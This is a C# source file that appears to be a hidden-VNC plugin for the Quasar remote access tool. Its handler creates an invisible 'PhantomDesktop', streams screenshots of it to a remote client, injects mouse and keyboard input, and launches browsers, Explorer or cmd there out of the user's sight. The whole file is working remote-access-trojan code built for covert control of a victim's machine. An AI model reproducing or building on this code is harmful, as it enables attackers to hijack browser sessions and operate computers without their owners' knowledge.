using Hidden_handler;
using Plugin.Helper;
using Plugin.Networking;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Messages
{
    public class RemoteDesktopHandler : IMessageProcessor
    {
        Imaging_handler ImageHandler = new Imaging_handler("PhantomDesktop");
        input_handler InputHandler = new input_handler("PhantomDesktop");
        Process_Handler ProcessHandler = new Process_Handler("PhantomDesktop");
        private UnsafeStreamCodec _streamCodec;

        Client client1 { get; set; }

        public bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is HvncInput ||
                                                          
                                                             message is HvncApplication ||
                                                             message is PlugDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;



        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case HvncInput msg:
                    Execute(sender, msg);
                    break;
                case HvncApplication msg:
                    Execute(sender, msg);
                    break;
            
                case PlugDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }



        public  RemoteDesktopHandler(Client client)
        {
            client1 = client;
        }

        private void Execute(ISender client, PlugDisconnect message)
        {
            client.Disconnect();

        }



        private void Execute(ISender client, GetDesktop message)
        {
            // TODO: Switch to streaming mode without request-response once switched from windows forms
            // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
            var monitorBounds = NativeMethodsHelper.GetBounds((message.DisplayIndex));
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();

                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ImageHandler.Screenshot();
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    client.Send(new GetDesktopResponse
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }
            }
            catch (Exception)
            {
                if (_streamCodec != null)
                {
                    client.Send(new GetDesktopResponse
                    {
                        Image = null,
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }

                _streamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }


        private void Execute(ISender sender, HvncInput message)
        {
            uint msg = message.msg;
            IntPtr wParam = (IntPtr)message.wParam;
            IntPtr lParam = (IntPtr)message.lParam;


            new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
        }

        private void Execute(ISender client, HvncApplication message)
        {
           switch(message.name)
            {
                case "Chrome":
                    ProcessHandler.Startchrome();
                    break;
                case "Explorer":
                    ProcessHandler.StartExplorer();
                    break;
                case "Cmd":
                    ProcessHandler.CreateProc("cmd");
                    break;
                case "Edge":
                    ProcessHandler.StartEdge();
                    break;
                case "Mozilla":
                    ProcessHandler.StartFirefox();
                    break;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                ImageHandler.Dispose();
                InputHandler.Dispose();
                _streamCodec?.Dispose();
            }
        }
    }
}
